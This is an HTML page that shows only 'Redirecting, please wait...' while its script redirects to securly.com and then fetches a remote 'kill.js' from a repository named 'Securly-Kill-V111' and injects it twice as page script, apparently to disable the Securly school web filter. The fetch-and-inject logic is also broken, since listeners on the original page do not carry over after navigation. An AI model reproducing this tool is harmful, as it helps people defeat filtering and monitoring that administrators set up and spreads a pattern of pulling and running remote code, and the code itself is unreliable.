<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting</title>
    <script>
        window.addEventListener('load', () => {
            const redirectUrl = 'https://securly.com';
            const scriptUrl = 'https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js';

            // Wait 3 seconds before starting execution
            setTimeout(() => {
                // Redirect to the new URL
                window.location.href = redirectUrl;

                // Listen for the 'pageshow' event after redirection
                window.addEventListener('pageshow', () => {
                    // Load the script once
                    fetch(scriptUrl)
                        .then(response => {
                            if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
                            return response.text();
                        })
                        .then(scriptContent => {
                            let executionCount = 0;

                            const executeScript = () => {
                                const scriptElement = document.createElement('script');
                                scriptElement.textContent = scriptContent;
                                document.body.appendChild(scriptElement);
                                console.log(`Injected script executed (${executionCount + 1}/2).`);

                                executionCount++;
                                if (executionCount < 2) {
                                    setTimeout(executeScript, 500); // Execute again after 500 ms
                                } else {
                                    console.log('Both script executions complete. Stopping page load.');
                                    window.stop(); // Stop page loading
                                }
                            };

                            // Execute the script for the first time
                            executeScript();
                        })
                        .catch(err => console.error('Error fetching script:', err));
                });
            }, 3000); // Initial delay (3 seconds)
        });
    </script>
</head>
<body>
    <p>Redirecting, please wait...</p>
</body>
</html>
